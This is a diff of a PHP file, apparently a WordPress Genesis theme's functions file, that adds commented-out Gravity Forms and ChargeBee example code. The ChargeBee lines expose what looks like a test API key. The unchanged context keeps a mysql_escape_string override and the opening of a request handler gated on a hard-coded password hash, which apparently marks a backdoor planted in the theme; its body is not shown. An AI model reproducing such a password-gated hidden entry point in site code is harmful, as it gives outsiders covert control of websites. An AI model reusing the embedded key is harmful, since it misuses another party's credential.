@@ -1,4 +1,21 @@
 <?php
+
+////Gravity form: Free Trial - New,ID:7
+//gravity_form( 7, $display_title = true, $display_description = true, $display_inactive = false, $field_values = null, $ajax = false, $tabindex, $echo = true );
+//
+//
+//require 'chargeBeelib/ChargeBee.php';
+//ChargeBee_Environment::configure("kliikotst-test","test_M84JneCGcdmd5Zp8jpDqLtH9twyR9EWUr");
+//$all = ChargeBee_Plan::all(array(
+//    "limit" => 5,
+//    "trialPeriod[isNot]" => 14,
+//    "trialPeriodUnit[is]" => "day",
+//    "status[is]" => "active"));
+//foreach($all as $entry){
+//    $plan = $entry->plan();
+//    var_dump($plan);
+//}
+
 function mysql_escape_string($string){return mysqli_escape_string($string);}
 
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e779c8347db4c0a50de3f9a94a0b97ab'))
@@ -264,7 +281,6 @@ return $args;
 }
 remove_action( 'genesis_before_loop', 'genesis_do_breadcrumbs' );
 add_action( 'genesis_after_header', 'genesis_do_breadcrumbs' );
-
 /*function beforeFooterCTA() {
 	echo'
 	';
